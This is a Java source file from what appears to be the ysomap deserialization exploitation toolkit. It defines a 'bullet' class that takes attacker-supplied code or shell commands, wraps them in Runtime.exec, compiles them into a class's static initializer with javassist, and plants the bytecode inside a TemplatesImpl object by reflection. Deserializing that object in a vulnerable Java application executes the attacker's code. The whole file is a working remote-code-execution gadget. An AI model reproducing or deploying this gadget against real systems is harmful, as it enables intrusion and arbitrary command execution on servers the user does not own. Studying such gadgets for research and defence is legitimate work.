package ysomap.core.bullet.jdk;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import ysomap.common.annotation.*;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
@Authors({ Authors.WH1T3P1G })
public class TemplatesImplBullet extends Bullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
    private String body;

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    @Override
    public Object getObject() throws Exception {
        if(body.startsWith("code:")){// code mode
            body = body.substring(5);
        }else{// system command execute mode
            if("false".equals(exception)){
                body = "java.lang.Runtime.getRuntime().exec(\"" +
                        body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                        "\");";
            }else{
                body = PayloadHelper.makeExceptionPayload(body);
            }
        }
        initClazz();
        // create evil bytecodes
        ClassPool pool = new ClassPool(true);
        CtClass cc = ClassFiles.makeClassFromExistClass(pool,
                            StubTransletPayload.class,
                            new Class<?>[]{abstractTranslet}
                );
        ClassFiles.insertStaticBlock(cc, body);
        ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        byte[] bytecodes = cc.toBytecode();
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", "Pwnr");
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }


    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        }else{
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
}
